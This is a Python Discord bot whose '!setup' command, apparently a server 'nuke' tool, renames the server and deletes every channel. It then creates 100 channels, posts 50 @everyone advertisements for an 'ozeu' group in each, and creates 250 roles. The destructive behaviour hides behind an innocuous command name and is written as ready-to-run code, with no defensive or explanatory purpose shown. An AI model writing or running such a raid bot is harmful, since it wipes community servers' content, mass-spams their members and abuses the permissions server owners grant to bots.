import os
import discord
from discord.ext import commands
import asyncio
import random

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

@bot.command(name="setup")
async def yaju(ctx):
    guild = ctx.guild
    await ctx.send("処理を開始します...")

    try:
        await guild.edit(name="おぜうの集い植民地")
    except Exception as e:
        print(f"サーバー名変更失敗: {e}")

    delete_tasks = [channel.delete() for channel in guild.channels]
    results = await asyncio.gather(*delete_tasks, return_exceptions=True)
    for r in results:
        if isinstance(r, Exception):
            print(f"チャンネル削除エラー: {r}")

    create_tasks = [guild.create_text_channel(f'おぜうの集い万歳-{i+1}') for i in range(100)]
    created_channels = await asyncio.gather(*create_tasks, return_exceptions=True)
    for ch in created_channels:
        if isinstance(ch, Exception):
            print(f"チャンネル作成エラー: {ch}")

    send_tasks = []
    for ch in created_channels:
        if isinstance(ch, discord.TextChannel):
            for _ in range(50):
                send_tasks.append(ch.send("""# @everyone おぜうの集いへ今すぐ参加！
[参加url](https://discord.gg/ozetudo) | [twitter](https://x.com/ozeu0301) | [twitter2](https://x.com/ozeusabu)  | [youtube](https://youtube.com/channel/UC_1kF_j3tYUQgwYQ9k1qvPQ?si=vXTrXWXIl9VG9uKE) | [video](https://youtu.be/ThA1rx9zc30?si=EhM2TQCQV5jwOckI) | [gif](https://imgur.com/NbBGFcf)"""))
    results = await asyncio.gather(*send_tasks, return_exceptions=True)
    for r in results:
        if isinstance(r, Exception):
            print(f"メッセージ送信エラー: {r}")

    role_tasks = []
    for i in range(250):
        color = discord.Color(random.randint(0, 0xFFFFFF))
        role_tasks.append(guild.create_role(name="ozeuによって", color=color))
    results = await asyncio.gather(*role_tasks, return_exceptions=True)
    for r in results:
        if isinstance(r, Exception):
            print(f"ロール作成エラー: {r}")

    await ctx.send("完了しました。")

if __name__ == "__main__":
    token = os.getenv("TOKEN")
    if not token:
        print("ERROR: TOKEN環境変数が設定されていません。")
    else:
        bot.run(token)
